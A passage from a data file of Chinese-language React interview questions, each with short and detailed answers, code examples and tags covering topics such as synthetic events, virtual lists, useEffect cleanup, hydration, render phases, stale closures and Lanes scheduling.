    return () => clearInterval(timer) // ✅ 正确清理
  }, [])
  return <div>Good</div>
}

// 不纯的 updater（双调用会暴露）
// ❌ 依赖外部变量
let seed = 0
function BadReducer(state, action) {
  seed++ // 副作用！双调用结果不同
  return { count: state.count + seed }
}
// ✅ 纯函数
function GoodReducer(state, action) {
  return { count: state.count + 1 }
}`,
                difficulty: 'medium',
                tags: ['StrictMode', '双调用', '副作用检测'],
                keyPoints: ['StrictMode 仅开发环境', '双调用暴露副作用', 'effect 双调用 mount-unmount-mount', '需修复暴露的副作用'],
              },
              {
                id: 'react-synthetic-events',
                domain: 'react',
                question: 'React 合成事件（SyntheticEvent）是什么？和原生事件有什么区别？',
                shortAnswer: '合成事件是 React 对原生事件的跨浏览器封装，提供统一 API。React 17 前事件委托到 document，17+ 委托到 root 容器。合成事件池在 17 已废弃，事件对象不再被复用。',
                detailedAnswer: '合成事件（SyntheticEvent）：\n\n- React 对浏览器原生事件的封装 wrapper\n- 提供统一 API（e.target、e.stopPropagation()），抹平浏览器差异\n- 同样支持事件委托（Event Delegation）\n\n与原生事件区别：\n\n| 维度 | 合成事件 | 原生事件 |\n|------|----------|----------|\n| 获取 | onXxx props | addEventListener |\n| 事件对象 | SyntheticEvent | native Event |\n| 委托位置 | root 容器（17+） | 各自元素 |\n| this 指向 | undefined（严格）/ 组件（bind） | 元素 |\n| 阻止默认 | e.preventDefault() | e.preventDefault() |\n| 原生事件 | e.nativeEvent | — |\n\n事件委托机制：\n- React 16 及以前：所有事件委托到 document\n  - 优点：统一管理，减少监听器\n  - 缺点：与第三方库（如 jQuery）事件冲突\n- React 17+：委托到 root 容器（ReactDOM.render 的容器）\n  - 解决与第三方库冲突\n  - 支持多个 React 应用同页（微前端）\n- React 18：委托到 root 容器（createRoot 的容器）\n\n执行顺序：\n- 合成事件在 React 的事件系统中冒泡\n- 原生事件先于合成事件执行（document 上绑的原生事件）\n- e.stopPropagation() 只阻止合成事件冒泡，不阻止原生\n- 要阻止原生：e.nativeEvent.stopImmediatePropagation()\n\n合成事件池（已废弃）：\n- React 16 及以前：SyntheticEvent 对象会被池化复用\n- 事件回调结束后 e 的属性被清空（null），异步访问报错\n- 需调用 e.persist() 保留或 e.target.value 先取值\n- React 17 已废弃事件池，e 不再被复用\n\n注意：\n- React 17+ 合成事件不再池化，异步访问安全\n- onChange 在 React 中是合成的（input+blur+key 等），与原生 change 不同\n- 原生事件和合成事件混合使用需注意执行顺序',
                codeExample: `// 合成事件
function Form() {
  const handleChange = (e) => {
    // e 是 SyntheticEvent，跨浏览器统一
    console.log(e.target.value) // 输入值
    e.preventDefault()          // 阻止默认
  }
  return <input onChange={handleChange} />
}

// 获取原生事件
function Click() {
  const handleClick = (e) => {
    console.log(e.nativeEvent) // 原生 Event 对象
  }
  return <button onClick={handleClick}>Click</button>
}

// React 16 事件池问题（17+ 已废弃）
function OldBug() {
  const handleClick = (e) => {
    setTimeout(() => {
      // React 16: e.target 是 null（已被池化清空）
      // React 17+: 正常访问
      console.log(e.target.value)
    }, 0)
    // React 16 需：e.persist() 或先取值 const val = e.target.value
  }
}

// 合成事件 vs 原生事件执行顺序
document.addEventListener("click", () => console.log("原生 document"))
function App() {
  return <div onClick={() => console.log("合成事件")} /> // 原生先执行
}`,
                difficulty: 'hard',
                tags: ['合成事件', 'SyntheticEvent', '事件委托', '面试必考'],
                keyPoints: ['合成事件跨浏览器封装', '17+ 委托到 root 容器', '事件池 17 已废弃', '原生事件先于合成执行'],
              },
              {
                id: 'react-virtual-list',
                domain: 'react',
                question: '虚拟列表（Virtual List）的实现原理是什么？',
                shortAnswer: '虚拟列表只渲染可视区域内的元素（+ 少量缓冲），通过滚动位置计算 start/end 索引，用 transform/padding 撑开总高度。核心：可视区高度 + 行高 + scrollTop 计算可见范围。',
                detailedAnswer: '虚拟列表原理：\n\n核心思路：只渲染可视区域内的列表项，而非全部\n\n关键参数：\n- containerHeight：可视容器高度\n- itemHeight：每项高度（固定或动态）\n- scrollTop：当前滚动位置\n- totalItems：总数据量\n\n计算可见范围：\n1. startIndex = Math.floor(scrollTop / itemHeight)\n2. endIndex = startIndex + Math.ceil(containerHeight / itemHeight)\n3. 只渲染 [startIndex - buffer, endIndex + buffer] 范围（buffer 缓冲避免空白）\n\n撑开总高度（保持滚动条正确）：\n- 方案 A：外层容器 height = totalItems * itemHeight，内层用 transform/paddingTop 偏移\n- 方案 B：上下各一个占位 div 撑开空间\n\n等高虚拟列表实现：\n```\nconst startIndex = Math.floor(scrollTop / itemHeight)\nconst endIndex = Math.min(startIndex + visibleCount, total)\nconst offsetY = startIndex * itemHeight\n\n<div onScroll={handleScroll} style={{ height: containerHeight, overflow: "auto" }}>\n  <div style={{ height: total * itemHeight, position: "relative" }}>\n    <div style={{ transform: `translateY(${offsetY}px)` }}>\n      {items.slice(startIndex, endIndex).map(...)}\n    </div>\n  </div>\n</div>\n```\n\n动态高度虚拟列表：\n- 预估每项高度，实际渲染后测量并缓存\n- 用缓存的高度计算偏移（前缀和）\n- 滚动时二分查找定位 startIndex\n- 比等高复杂，但支持不规则内容\n\n成熟库：\n- react-window：轻量，推荐（react-virtualized 作者新作）\n- react-virtualized：功能全但较重\n- @tanstack/react-virtual：框架无关，headless\n- react-virtuoso：高级功能（分组、倒序）\n\n适用场景：\n- 千级以上列表\n- 聊天记录、数据表格、长 feed\n- 树形结构（虚拟树）\n\n注意事项：\n- 搜索/过滤后需重新计算\n- 键盘导航需处理 focus\n- 无障碍需 aria-rowcount 等',
                codeExample: `// 等高虚拟列表简易实现
function VirtualList({ items, itemHeight = 50, containerHeight = 600 }) {\n  const [scrollTop, setScrollTop] = useState(0)\n  const visibleCount = Math.ceil(containerHeight / itemHeight) + 4 // 缓冲\n  const startIndex = Math.max(0, Math.floor(scrollTop / itemHeight) - 2)\n  const endIndex = Math.min(startIndex + visibleCount, items.length)\n  const offsetY = startIndex * itemHeight\n\n  return (\n    <div\n      style={{ height: containerHeight, overflow: "auto" }}\n      onScroll={(e) => setScrollTop(e.target.scrollTop)}\n    >\n      <div style={{ height: items.length * itemHeight, position: "relative" }}>\n        <div style={{ transform: "translateY(" + offsetY + "px)" }}>\n          {items.slice(startIndex, endIndex).map((item, i) => (\n            <div key={startIndex + i} style={{ height: itemHeight }}>\n              {item.text}\n            </div>\n          ))}\n        </div>\n      </div>\n    </div>\n  )\n}`,
                difficulty: 'hard',
                tags: ['虚拟列表', '性能优化', '大数据渲染'],
                keyPoints: ['只渲染可视区域', 'scrollTop 计算可见范围', '撑开总高度保持滚动条', '动态高度需缓存测量'],
              },
              {
                id: 'react-controlled-uncontrolled',
                domain: 'react',
                question: '受控组件和非受控组件的区别？何时用哪个？',
                shortAnswer: '受控组件：表单值由 React state 控制（value + onChange）。非受控组件：表单值由 DOM 管理（defaultValue + ref 读取）。推荐受控（数据流单一），非受控用于简单场景或集成第三方。',
                detailedAnswer: '受控组件（Controlled）：\n\n- 表单元素的 value 由 React state 控制\n- onChange 更新 state，state 驱动 value\n- React 是 single source of truth\n\n<input value={text} onChange={(e) => setText(e.target.value)} />\n\n特点：\n- 数据流单向：state → value → onChange → setState\n- 即时验证、条件禁用、格式化\n- 表单数据在 React 中，易于提交/重置\n\n非受控组件（Uncontrolled）：\n\n- 表单元素的值由 DOM 自身管理\n- 用 defaultValue 设置初始值，ref 读取最终值\n- React 不控制中间状态\n\n<input defaultValue={initialText} ref={inputRef} />\nconst value = inputRef.current.value\n\n特点：\n- 更接近传统 HTML 表单\n- 代码简单，无需每次输入触发渲染\n- 读取时才获取值（非实时）\n\n何时用受控（推荐）：\n- 需要即时验证（如手机号格式）\n- 需要条件渲染（如输入时显示建议）\n- 需要禁用/格式化输入\n- 表单数据需在 React 中流转\n- 多字段联动\n\n何时用非受控：\n- 简单表单，仅提交时读取\n- file input（只能非受控，安全限制）\n- 集成非 React 代码（如 jQuery 插件）\n- 性能敏感（大表单避免每次输入重渲染）\n\n混合方案：\n- 大表单中部分字段非受控（减少渲染）\n- 用 react-hook-form（非受控 + 验证）\n- Formik / react-hook-form 简化表单管理\n\nkey 重置技巧：\n- <input key={userId} defaultValue={...} />\n- userId 变化时组件重建，defaultValue 重新生效\n- 替代手动重置表单',
                codeExample: `// 受控组件（推荐）
function ControlledForm() {\n  const [email, setEmail] = useState("")\n  const [password, setPassword] = useState("")\n  return (\n    <form onSubmit={(e) => { e.preventDefault(); console.log(email, password) }}>\n      <input value={email} onChange={(e) => setEmail(e.target.value)} />\n      <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} />\n      <button type="submit">Submit</button>\n    </form>\n  )\n}\n\n// 非受控组件\nfunction UncontrolledForm() {\n  const emailRef = useRef()\n  const passwordRef = useRef()\n  return (\n    <form onSubmit={(e) => {\n      e.preventDefault()\n      console.log(emailRef.current.value, passwordRef.current.value)\n    }}>\n      <input defaultValue="" ref={emailRef} />\n      <input type="password" defaultValue="" ref={passwordRef} />\n      <button type="submit">Submit</button>\n    </form>\n  )\n}\n\n// file input 只能非受控\nfunction FileInput() {\n  const fileRef = useRef()\n  return <input type="file" ref={fileRef} />\n}`,
                difficulty: 'easy',
                tags: ['受控组件', '非受控组件', '表单'],
                keyPoints: ['受控由 state 控制 value', '非受控由 DOM 管理 ref 读取', '推荐受控数据流单一', 'file input 只能非受控'],
              },
              {
                id: 'react-use-effect-cleanup',
                domain: 'react',
                question: 'useEffect 的清理函数何时执行？依赖数组为空、有依赖、无依赖数组分别什么效果？',
                shortAnswer: '清理函数在组件卸载时 + 依赖变化重新执行 effect 前执行。空数组 []：仅 mount 执行一次，unmount 清理。有依赖 [a,b]：依赖变化时执行。无数组：每次 render 后都执行。',
                detailedAnswer: 'useEffect 执行时机：\n\n1. 无依赖数组 useEffect(() => { ... })：\n- 每次渲染后都执行（mount + 每次更新）\n- 极少使用，除非副作用依赖所有渲染\n\n2. 空数组 useEffect(() => { ... }, [])：\n- 仅 mount 后执行一次\n- unmount 时执行清理\n- 适合初始化（订阅、定时器、事件监听）\n\n3. 有依赖数组 useEffect(() => { ... }, [a, b])：\n- mount 后执行\n- 依赖 a 或 b 变化时，先执行清理，再执行新 effect\n- unmount 时执行清理\n\n清理函数执行时机：\n- 组件 unmount 时\n- 依赖变化导致 effect 重新执行前（先清理旧的，再执行新的）\n- 首次执行 effect 时无清理（之前没执行过）\n\n执行顺序示例（依赖 [count]）：\n```\nmount → 执行 effect(count=0)\ncount 变为 1 → 执行 cleanup(count=0) → 执行 effect(count=1)\ncount 变为 2 → 执行 cleanup(count=1) → 执行 effect(count=2)\nunmount → 执行 cleanup(count=2)\n```\n\n闭包陷阱：\n- 空依赖 [] 中访问的 state/props 是 mount 时的旧值\n- 解决：\n  a) 用 useRef 保存最新值\n  b) 加依赖（但可能导致频繁执行）\n  c) 用函数式更新 setCount(prev => prev + 1)\n\n常见模式：\n```\n// 1. 事件监听\nuseEffect(() => {\n  window.addEventListener("resize", handler)\n  return () => window.removeEventListener("resize", handler)\n}, [])\n\n// 2. 定时器\nuseEffect(() => {\n  const timer = setInterval(() => { ... }, 1000)\n  return () => clearInterval(timer)\n}, [dep])\n\n// 3. 订阅\nuseEffect(() => {\n  const sub = ws.subscribe(handler)\n  return () => sub.unsubscribe()\n}, [dep])\n\n// 4. 数据获取\nuseEffect(() => {\n  let cancelled = false\n  fetchData().then(data => { if (!cancelled) setData(data) })\n  return () => { cancelled = true } // 防止卸载后 setState\n}, [dep])\n```\n\nReact 18 StrictMode 双调用：\n- 开发模式：mount → effect → cleanup → effect（模拟卸载重挂）\n- 确保清理函数正确\n- 生产环境不双调用',
                codeExample: `// 1. 空数组：仅 mount 执行\nuseEffect(() => {\n  console.log("mount")\n  return () => console.log("unmount") // 仅 unmount 清理\n}, [])\n\n// 2. 有依赖：依赖变化时先清理再执行\nuseEffect(() => {\n  console.log("effect", count)\n  return () => console.log("cleanup", count) // 旧 count\n}, [count])\n// mount → effect 0\n// count=1 → cleanup 0 → effect 1\n// count=2 → cleanup 1 → effect 2\n// unmount → cleanup 2\n\n// 3. 无数组：每次 render 后执行\nuseEffect(() => {\n  console.log("every render")\n})\n\n// 4. 数据获取防竞态\nuseEffect(() => {\n  let cancelled = false\n  fetchUser(userId).then(data => {\n    if (!cancelled) setUser(data)\n  })\n  return () => { cancelled = true }\n}, [userId])\n\n// 5. 闭包陷阱\nconst [count, setCount] = useState(0)\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log(count) // ❌ 始终 0（闭包旧值）\n    setCount(count + 1) // ❌ 始终设为 1\n  }, 1000)\n  return () => clearInterval(timer)\n}, []) // 空依赖闭包旧值\n// ✅ 用函数式更新\nsetCount(prev => prev + 1)`,
                difficulty: 'medium',
                tags: ['useEffect', '清理函数', '依赖数组', '闭包陷阱'],
                keyPoints: ['清理在 unmount + 依赖变化前', '空数组仅 mount', '有依赖变化时清理+重执行', '闭包陷阱用 ref 或函数式更新'],
              },
              {
                id: 'react-component-communication',
                domain: 'react',
                question: 'React 组件通信有哪些方式？分别适用什么场景？',
                shortAnswer: '1) 父→子：props 2) 子→父：回调函数 3) 兄弟：提升状态到共同父 4) 跨层：Context 5) 全局：Redux/Zustand 6) 任意：Event Bus（不推荐）。推荐 props/Context/状态管理，避免 Event Bus。',
                detailedAnswer: 'React 组件通信方式：\n\n1. 父→子：props\n- 父组件传 props 给子组件\n- 最基础、最常用\n- <Child data={data} />\n\n2. 子→父：回调函数\n- 父传一个回调函数作为 props\n- 子组件调用回调传数据给父\n- <Child onEvent={(data) => { ... }} />\n- 子：props.onEvent(data)\n\n3. 兄弟组件：状态提升\n- 将共享状态提升到共同父组件\n- 父组件管理 state，通过 props 分发给兄弟\n- 适合层级浅的兄弟\n\n4. 跨层级：Context\n- createContext + Provider + useContext\n- 避免逐层 props 透传\n- 适合主题、用户信息等全局数据\n\n5. 全局状态：Redux / Zustand / Jotai\n- 集中管理应用状态\n- 任意组件可订阅/更新\n- 适合中大型应用\n\n6. 任意组件：Event Bus / EventEmitter\n- 发布订阅模式\n- 不推荐：难以追踪数据流、调试困难、内存泄漏风险\n- React 推荐用状态管理库替代\n\n7. ref 命令式调用\n- forwardRef + useImperativeHandle\n- 父组件调用子组件暴露的方法\n- 适合表单、播放器等命令式操作\n\n8. URL 参数\n- 路由参数 /user/:id\n- query 参数 ?tab=info\n- 适合页面间共享状态\n\n选择建议：\n- 简单父子 → props + 回调\n- 跨层 → Context\n- 全局状态 → Zustand（轻量）/ Redux（复杂）\n- 页面间 → URL 参数 + 路由\n- 表单 → react-hook-form\n\n不推荐：\n- Event Bus：反 React 模式，难以追踪\n- 全局变量：难以调试、不触发渲染\n- ref 通信：命令式，破坏数据流',
                codeExample: `// 1. 父→子 props
function Parent() {\n  const [data, setData] = useState("hello")\n  return <Child data={data} />\n}\n\n// 2. 子→父 回调\nfunction Parent() {\n  const handle = (msg) => console.log(msg)\n  return <Child onTell={handle} />\n}\nfunction Child({ onTell }) {\n  return <button onClick={() => onTell("hi")}>Tell</button>\n}\n\n// 3. 兄弟 状态提升\nfunction Parent() {\n  const [count, setCount] = useState(0)\n  return (\n    <>\n      <BrotherA count={count} />\n      <BrotherB onAdd={() => setCount(count + 1)} />\n    </>\n  )\n}\n\n// 4. 跨层 Context\nconst ThemeCtx = createContext()\nfunction App() {\n  return <ThemeCtx.Provider value="dark"><Deep /></ThemeCtx.Provider>\n}\nfunction Deep() {\n  const theme = useContext(ThemeCtx)\n  return <div>{theme}</div>\n}\n\n// 5. 全局 Zustand\nconst useStore = create((set) => ({ count: 0, add: () => set((s) => ({ count: s.count + 1 })) }))\nfunction Any() {\n  const { count, add } = useStore()\n  return <button onClick={add}>{count}</button>\n}`,
                difficulty: 'easy',
                tags: ['组件通信', 'props', 'Context', '状态管理'],
                keyPoints: ['父子用 props/回调', '兄弟状态提升', '跨层用 Context', '全局用 Redux/Zustand'],
              },
              {
                id: 'react-hydration',
                domain: 'react',
                question: 'React SSR 的 Hydration（水合）是什么？为什么可能出现 hydration mismatch？',
                shortAnswer: 'Hydration 是服务端渲染的 HTML 与客户端 JS 关联的过程：React 给已有 DOM 附加事件监听，复用 DOM 而非重建。mismatch 因服务端和客户端渲染结果不一致导致，需确保两端一致。',
                detailedAnswer: 'SSR 与 Hydration 流程：\n\n1. 服务端渲染：\n- Node 执行 React 组件，生成 HTML 字符串\n- 返回完整 HTML 给浏览器\n- 用户快速看到首屏内容（利于 SEO）\n\n2. 客户端 Hydration：\n- 浏览器下载 HTML 并展示（快速首屏）\n- 下载 JS bundle\n- React 在客户端执行，复用服务端生成的 DOM\n- 附加事件监听，不重建 DOM\n- hydrateRoot(container, <App />)\n\nHydration vs Client Rendering：\n- render：创建新 DOM（createElement）\n- hydrate：复用已有 DOM，附加事件\n- hydrate 更快（不重建 DOM），但要求 DOM 一致\n\nHydration Mismatch（水合不匹配）：\n- 服务端渲染的 HTML 与客户端首次渲染的虚拟 DOM 不一致\n- React 18 会警告并丢弃服务端 HTML，重新渲染（浪费性能）\n\n常见 mismatch 原因：\n\n1. 时间相关：\n- 服务端和客户端时间不同\n- new Date() / Date.now() 不同\n- 解决：用 useEffect 中设置时间（仅客户端）\n\n2. 随机数：\n- Math.random() 两端不同\n- 解决：用稳定的 seed 或 useEffect 中生成\n\n3. window/document 引用：\n- 服务端无 window/document\n- 组件中直接用 window.innerWidth 导致差异\n- 解决：用 useEffect 或 typeof window 判断\n\n4. 用户特定数据：\n- 服务端无登录态，客户端有\n- 解决：占位符 + 客户端 useEffect 更新\n\n5. 第三方库：\n- 某些库依赖 window 或有副作用\n- 解决：dynamic import + ssr: false\n\n6. CSS 类名差异：\n- CSS-in-JS 注入顺序不同\n- 解决：确保 styled-components 配置一致\n\nReact 18 改进：\n- hydrateRoot API\n- 流式 SSR（renderToPipeableStream）\n- Selective Hydration：可优先水合用户交互的区域\n- Suspense 配合：逐步水合\n\nNext.js / Remix：\n- 框架处理 SSR + Hydration 细节\n- 开发者关注组件即可\n- use server / use client 区分服务端/客户端组件',
                codeExample: `// SSR 基本流程
// server
import { renderToString } from "react-dom/server"
app.get("/", (req, res) => {\n  const html = renderToString(<App />)\n  res.send("<div id=\"root\">" + html + "</div>")\n})\n\n// client\nimport { hydrateRoot } from "react-dom/client"\nhydrateRoot(document.getElementById("root"), <App />)\n\n// ❌ Mismatch：时间不同\nfunction Clock() {\n  return <div>{new Date().toLocaleTimeString()}</div>\n  // 服务端渲染时间 vs 客户端水合时间不同\n}\n\n// ✅ 修复：useEffect 仅客户端更新\nfunction Clock() {\n  const [time, setTime] = useState(null)\n  useEffect(() => {\n    setTime(new Date().toLocaleTimeString())\n    const timer = setInterval(() => setTime(new Date().toLocaleTimeString()), 1000)\n    return () => clearInterval(timer)\n  }, [])\n  return <div>{time || "Loading..."}</div>\n}\n\n// ❌ Mismatch：window 引用\nfunction Layout() {\n  return <div>{window.innerWidth}</div> // 服务端无 window\n}\n\n// ✅ 修复\nfunction Layout() {\n  const [width, setWidth] = useState(0)\n  useEffect(() => {\n    setWidth(window.innerWidth)\n    window.addEventListener("resize", () => setWidth(window.innerWidth))\n  }, [])\n  return <div>{width}</div>\n}`,
                difficulty: 'hard',
                tags: ['SSR', 'Hydration', '水合', '面试必考'],
                keyPoints: ['Hydration 复用 DOM 附加事件', 'mismatch 因两端渲染不一致', '时间/随机/window 导致 mismatch', 'useEffect 修复客户端差异'],
              },
              {
                id: 'react-render-phases',
                domain: 'react',
                question: 'React 的渲染流程分为哪两个阶段？各阶段做什么？',
                shortAnswer: '分 Render Phase（协调阶段）和 Commit Phase（提交阶段）。Render Phase：构建 Fiber 树、计算变更，纯计算无副作用，可中断。Commit Phase：同步应用 DOM 变更、执行生命周期/useEffect，不可中断。',
                detailedAnswer: 'React 渲染两大阶段：\n\n1. Render Phase（协调阶段）：\n- 纯计算阶段，无副作用\n- 构建 workInProgress Fiber 树\n- 对比 current 和 workInProgress，计算变更（Diff）\n- 可被中断/恢复（Concurrent 模式下）\n- 包含：\n  - 函数组件执行（render）\n  - 类组件 render() 调用\n  - shouldComponentUpdate\n  - getDerivedStateFromProps\n  - reconciliation（Diff 算法）\n- 此阶段不应有副作用（StrictMode 双调用检测）\n\n2. Commit Phase（提交阶段）：\n- 同步执行，不可中断\n- 将 Render Phase 计算的变更应用到 DOM\n- 包含三个子阶段：\n  a) Before mutation：getSnapshotBeforeUpdate\n  b) Mutation：DOM 插入/更新/删除（appendChild 等）\n  c) Layout：useLayoutEffect、componentDidMount、componentDidUpdate\n- 之后异步执行：useEffect（passive effects）\n\n执行顺序示例：\n```\nsetState → 调度更新 →\n[Render Phase]\n  执行函数组件/类 render → Diff → 计算 effects\n  （可中断，Concurrent 模式下）\n[Commit Phase]\n  Before mutation → DOM 变更 → Layout effects\n  （同步不可中断）\n[Passive Effects]\n  useEffect 异步执行\n```\n\n为何分两阶段：\n- Render Phase 可中断：长任务切片，不阻塞主线程\n- Commit Phase 不可中断：保证 DOM 一致性\n- useEffect 放 Commit 后异步：不阻塞屏幕更新\n\n注意事项：\n- Render Phase 执行多次是安全的（幂等）\n- 不要在 render 中产生副作用（修改全局变量、发请求）\n- useLayoutEffect 在 Commit 同步执行，阻塞绘制\n- useEffect 在 Commit 后异步执行，不阻塞绘制\n- React 18 Concurrent：Render Phase 可被更高优先级打断',
                codeExample: `// Render Phase vs Commit Phase 示例
function App({ userId }) {\n  const [user, setUser] = useState(null)\n\n  // Render Phase：纯计算，可多次执行\n  const display = user ? user.name : "Loading"\n\n  // Commit Phase 后异步执行（Passive Effect）\n  useEffect(() => {\n    // DOM 已更新，可安全操作\n    fetchUser(userId).then(setUser)\n  }, [userId])\n\n  // Commit Phase 同步执行（Layout Effect）\n  useLayoutEffect(() => {\n    // DOM 已变更但未绘制，可读取布局\n    const height = ref.current.offsetHeight\n    if (height > 500) adjustLayout()\n  })\n\n  return <div ref={ref}>{display}</div>\n}\n\n// ❌ 错误：在 Render Phase 产生副作用\nfunction Bad({ count }) {\n  document.title = count // 副作用！应在 useEffect 中\n  return <div>{count}</div>\n}\n\n// ✅ 正确\nfunction Good({ count }) {\n  useEffect(() => {\n    document.title = count\n  }, [count])\n  return <div>{count}</div>\n}`,
                difficulty: 'hard',
                tags: ['Render Phase', 'Commit Phase', '渲染流程'],
                keyPoints: ['Render Phase 纯计算可中断', 'Commit Phase 同步不可中断', 'useLayoutEffect 同步 use Effect 异步', 'render 中不应有副作用'],
              },
              {
                id: 'react-closure-trap',
                domain: 'react',
                question: 'React 中的闭包陷阱（Stale Closure）是什么？如何解决？',
                shortAnswer: '闭包陷阱：useEffect/useCallback 的回调捕获了旧渲染周期的 state/props，导致读到过时值。解决：1) 加依赖数组 2) 用 useRef 保存最新值 3) 用函数式更新 setState(prev => ...) 4) 用 useRef + useEvent 模式。',
                detailedAnswer: '闭包陷阱（Stale Closure）：\n\n每次组件渲染，函数组件重新执行，所有变量/函数都是新的闭包。useEffect/useCallback/useMemo 的回调捕获的是创建时的闭包（那一次渲染的值）。如果依赖数组不包含该值，回调中读到的永远是旧值。\n\n常见场景：\n\n1. useEffect 空依赖读旧 state：\n```\nconst [count, setCount] = useState(0)\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log(count) // 始终 0（mount 时的闭包）\n    setCount(count + 1) // 始终设为 1\n  }, 1000)\n  return () => clearInterval(timer)\n}, [])\n```\n\n2. useCallback 闭包旧 props：\n```\nconst handleClick = useCallback(() => {\n  console.log(userId) // 旧 userId\n}, []) // 空依赖闭包旧值\n```\n\n3. 事件监听器闭包旧值：\n```\nuseEffect(() => {\n  window.addEventListener("scroll", () => {\n    console.log(scrollY) // 旧值\n  })\n}, [])\n```\n\n解决方案：\n\n1. 加依赖数组（最直接）：\n- 把用到的 state/props 加入依赖\n- 缺点：可能导致 effect 频繁重新执行（如定时器反复创建）\n\n2. 函数式更新（适用于 setState）：\n- setCount(prev => prev + 1) // 基于最新 state\n- 不需要 count 在依赖中\n\n3. useRef 保存最新值：\n```\nconst countRef = useRef(count)\ncountRef.current = count // 每次渲染更新\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log(countRef.current) // 最新值\n    setCount(countRef.current + 1)\n  }, 1000)\n  return () => clearInterval(timer)\n}, []) // 空依赖但能读最新值\n```\n\n4. useEvent 模式（React 19 useEvent / 实验性）：\n- 返回一个稳定引用但始终读最新值的函数\n- 目前可用 useRef + useMemo 模拟\n\n5. useReducer 替代多个相关 state：\n- 把逻辑放 reducer 中，避免闭包问题\n\n最佳实践：\n- 依赖数组要完整（用 eslint-plugin-react-hooks 检查）\n- 定时器/事件监听用 useRef 保存最新值\n- setState 用函数式更新\n- 复杂逻辑用 useReducer',
                codeExample: `// ❌ 闭包陷阱
function Counter() {\n  const [count, setCount] = useState(0)\n  useEffect(() => {\n    const timer = setInterval(() => {\n      setCount(count + 1) // 始终设为 1\n    }, 1000)\n    return () => clearInterval(timer)\n  }, []) // count 不在依赖，闭包旧值\n  return <div>{count}</div>\n}\n\n// ✅ 方案1：函数式更新\nuseEffect(() => {\n  const timer = setInterval(() => {\n    setCount((prev) => prev + 1) // 基于最新值\n  }, 1000)\n  return () => clearInterval(timer)\n}, [])\n\n// ✅ 方案2：useRef 保存最新值\nfunction Counter() {\n  const [count, setCount] = useState(0)\n  const countRef = useRef(count)\n  countRef.current = count\n  useEffect(() => {\n    const timer = setInterval(() => {\n      setCount(countRef.current + 1)\n    }, 1000)\n    return () => clearInterval(timer)\n  }, [])\n  return <div>{count}</div>\n}\n\n// ✅ 方案3：加依赖（定时器会反复创建，性能差）\nuseEffect(() => {\n  const timer = setInterval(() => {\n    setCount(count + 1)\n  }, 1000)\n  return () => clearInterval(timer)\n}, [count]) // count 变化时重建定时器`,
                difficulty: 'hard',
                tags: ['闭包陷阱', 'Stale Closure', 'useEffect', 'useRef'],
                keyPoints: ['回调捕获创建时的闭包', '空依赖读到旧值', '函数式更新解决 setState', 'useRef 保存最新值'],
              },
              {
                id: 'react-lanes-scheduling',
                domain: 'react',
                question: 'React 18 的 Lanes 优先级调度模型是什么？',
                shortAnswer: 'Lanes 是 React 18 的优先级模型，用 31 位二进制表示多种优先级（SyncLane、InputContinuousLane、DefaultLane、TransitionLane、IdleLane 等）。高优先级更新可打断低优先级渲染，实现并发。',
                detailedAnswer: 'React 优先级模型演进：\n- React 15：无优先级（同步递归）\n- React 16 Fiber：ExpirationTime（单个过期时间）\n- React 18：Lanes（多车道优先级，更灵活）\n\nLanes 模型：\n- 用 31 位二进制位表示优先级，每位代表一个 Lane\n- 多个 Lane 可同时存在（位运算）\n- 高优先级 Lane 先处理\n\n主要 Lane 优先级（从高到低）：\n1. SyncLane（同步，最高）：同步执行，不可中断\n2. InputContinuousLane（连续输入）：如拖拽、连续触摸\n3. DefaultLane（默认）：普通更新\n4. TransitionLane（过渡）：startTransition 标记的更新\n5. RetryLane（重试）：Suspense 数据重试\n6. IdleLane（空闲）：最低优先级，空闲时执行\n\n工作原理：\n1. setState 时分配一个 Lane（根据更新来源）\n2. 调度器按 Lane 优先级排序任务\n3. 渲染时选择最高优先级的 Lane 处理\n4. 高优先级更新到来时，可打断低优先级渲染\n5. 被打断的低优先级更新稍后恢复（复用已完成的 Fiber）\n\n与 ExpirationTime 的区别：\n- ExpirationTime：单一优先级，新旧更新难以比较\n- Lanes：多维优先级，可批量处理同优先级更新\n- Lanes 支持更细粒度的并发控制\n\n应用场景：\n- 用户输入（InputContinuousLane）：立即响应\n- 列表过滤（TransitionLane）：可被输入打断\n- 数据预取（IdleLane）：空闲时执行\n- Suspense 重试（RetryLane）：适当优先级重试\n\nstartTransition 原理：\n- startTransition(() => setState(...)) 将更新标记为 TransitionLane\n- 低于输入优先级，可被输入打断\n- useTransition 返回 isPending 表示过渡中\n\nuseDeferredValue 原理：\n- 延迟值的更新到 TransitionLane\n- 紧急更新先处理，延迟值稍后更新',
                codeExample: `// 1. 不同优先级的更新
function App() {\n  const [input, setInput] = useState("")\n  const [results, setResults] = useState([])\n  const [isPending, startTransition] = useTransition()\n\n  function handleChange(e) {\n    setInput(e.target.value) // DefaultLane：紧急，立即更新\n    startTransition(() => {\n      setResults(filter(hugeList, e.target.value)) // TransitionLane：可中断\n    })\n  }\n\n  return (\n    <>\n      <input value={input} onChange={handleChange} />\n      {isPending ? <Spinner /> : <List items={results} />}\n    </>\n  )\n}\n\n// 2. 空闲优先级（如预取数据）\nstartTransition(() => {\n  prefetchData() // IdleLane，空闲时执行\n})\n\n// 3. 同步优先级（flushSync 强制同步）\nimport { flushSync } from "react-dom"\nfunction handleClick() {\n  flushSync(() => {\n    setData(newData) // SyncLane，立即同步处理\n  })\n  console.log("DOM 已更新") // flushSync 后 DOM 已更新\n}`,
                difficulty: 'hard',
                tags: ['Lanes', '优先级', '调度', 'Concurrent'],
                keyPoints: ['Lanes 31 位优先级模型', '高优先级打断低优先级', 'SyncLane 最高 IdleLane 最低', 'startTransition 标记 TransitionLane'],
              },
              {
                id: 'react-server-components',
                domain: 'react',
                question: 'React Server Components（RSC）是什么？和 SSR 有什么区别？',
                shortAnswer: 'RSC 是在服务端渲染且不在客户端运行的组件，零 JS 打包到前端。区别：SSR 每次请求渲染 HTML 后需 Hydration；RSC 只渲染一次输出序列化数据，不需 Hydration，可和客户端组件混用。',
